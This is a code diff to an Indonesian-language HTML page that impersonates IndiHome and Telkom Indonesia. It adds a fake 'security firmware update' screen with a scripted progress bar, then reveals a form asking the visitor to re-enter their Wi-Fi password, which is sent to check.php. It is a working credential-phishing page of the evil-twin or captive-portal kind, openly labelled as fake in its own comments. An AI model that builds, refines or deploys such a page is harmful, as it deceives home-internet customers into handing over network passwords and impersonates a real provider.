@@ -72,15 +72,73 @@
             font-size: 12px;
             color: #aaa;
         }
+    <style>
+        /* Loading Screen Styles */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #e60000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            width: 80%;
+            max-width: 300px;
+            height: 10px;
+            background-color: #eee;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        .progress-fill {
+            height: 100%;
+            background-color: #e60000;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        #login-form {
+            display: none; /* Hidden by default */
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Pastikan file logo.png ada di folder yang sama -->
+    <!-- Fake Firmware Update Screen -->
+    <div id="loading-screen">
+        <img src="logo.png" alt="IndiHome" class="logo" style="width: 150px;">
+        <h3 style="color: #333;">Mengupdate Security Firmware...</h3>
+        <p style="color: #666; font-size: 14px;">Mohon jangan matikan modem Anda.</p>
+        <div class="loader"></div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+        <p id="percent" style="font-size: 12px; color: #888; margin-top: 5px;">0%</p>
+    </div>
+
+    <!-- Actual Login Form -->
+    <div class="container" id="login-form">
         <img src="logo.png" alt="IndiHome" class="logo">
         
         <h2>Verifikasi Koneksi</h2>
-        <p>Koneksi internet Anda sedang kami perbarui. Silakan masukkan kembali <strong>Kata Sandi Wi-Fi</strong> Anda untuk verifikasi dan melanjutkan brosing.</p>
+        <p>Update berhasil. Silakan masukkan kembali <strong>Kata Sandi Wi-Fi</strong> Anda untuk verifikasi dan melanjutkan browsing.</p>
         
         <form method="POST" action="check.php">
             <input type="password" name="password" placeholder="Kata Sandi Wi-Fi" required>
@@ -91,5 +149,33 @@
             &copy; 2026 PT Telkom Indonesia (Persero) Tbk.
         </div>
     </div>
+
+    <script>
+        // Simulate Firmware Update
+        let progress = 0;
+        const progressFill = document.getElementById('progress');
+        const percentText = document.getElementById('percent');
+        const loadingScreen = document.getElementById('loading-screen');
+        const loginForm = document.getElementById('login-form');
+
+        const interval = setInterval(() => {
+            // Random increment
+            progress += Math.floor(Math.random() * 5) + 1;
+            
+            if (progress > 100) progress = 100;
+
+            progressFill.style.width = progress + '%';
+            percentText.innerText = progress + '%';
+
+            if (progress === 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    // Update finished, show login form
+                    loadingScreen.style.display = 'none';
+                    loginForm.style.display = 'block';
+                }, 1000);
+            }
+        }, 300); // Speed of update
+    </script>
 </body>
 </html>
